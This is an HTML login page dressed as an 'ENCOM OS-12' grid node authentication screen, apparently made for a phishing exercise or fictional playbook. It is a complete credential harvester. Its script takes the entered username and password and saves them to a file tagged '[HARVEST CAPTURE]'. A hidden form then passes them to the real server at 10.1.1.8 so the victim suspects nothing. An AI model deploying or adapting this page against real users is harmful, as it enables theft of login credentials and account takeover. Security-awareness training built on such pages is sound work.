<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ENCOM OS-12 Login</title>
    <style>
        body { background-color: #000; color: #00ffcc; font-family: monospace; padding: 50px; }
        .login-box { border: 2px solid #00ffcc; padding: 20px; width: 300px; margin: 0 auto; box-shadow: 0 0 15px #00ffcc; }
        input[type="text"], input[type="password"] { width: 100%; margin-bottom: 10px; background: #111; color: #fff; border: 1px solid #00ffcc; padding: 5px; box-sizing: border-box; }
        input[type="submit"] { background: #00ffcc; color: #000; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="login-box">
    <h2>Grid Node Authentication</h2>
    <!-- Visible interface for the user -->
    <form id="harvesterForm">
        <label for="username">Username:</label>
        <input type="text" id="username" required autocomplete="off">
        
        <label for="password">Password:</label>
        <input type="password" id="password" required>
        
        <input type="submit" value="ESTABLISH HANDSHAKE">
    </form>
</div>

<!-- Hidden form that relays the credentials to the real production server -->
<form id="realLoginForm" action="http://10.1.1.8" method="POST" style="display:none;">
    <input type="text" id="realUser" name="username">
    <input type="password" id="realPass" name="password">
</form>

<script>
document.getElementById('harvesterForm').addEventListener('submit', function(e) {
    e.preventDefault(); // Stop normal form processing
    
    var user = document.getElementById('username').value;
    var pass = document.getElementById('password').value;
    
    // Format the capture data string to match your playbook log output
    var logText = "[HARVEST CAPTURE] USER: " + user + " | PASS: " + pass + "\n";
    
    // Convert text data into a safe Base64 string for a local Data URI download
    var encodedUri = 'data:text/plain;base64,' + btoa(logText);
    
    // Create and trigger the local file saving mechanism in browser memory
    var downloadLink = document.createElement("a");
    downloadLink.setAttribute("href", encodedUri);
    downloadLink.setAttribute("download", "encom_session_debug.txt");
    document.body.appendChild(downloadLink);
    downloadLink.click();
    document.body.removeChild(downloadLink);
    
    // Copy the values to the hidden form pointing to the real server
    document.getElementById('realUser').value = user;
    document.getElementById('realPass').value = pass;
    
    // Tiny delay to allow the local download to trigger, then submit to the real server
    setTimeout(function() {
        document.getElementById('realLoginForm').submit();
    }, 300);
});
</script>

</body>
</html>
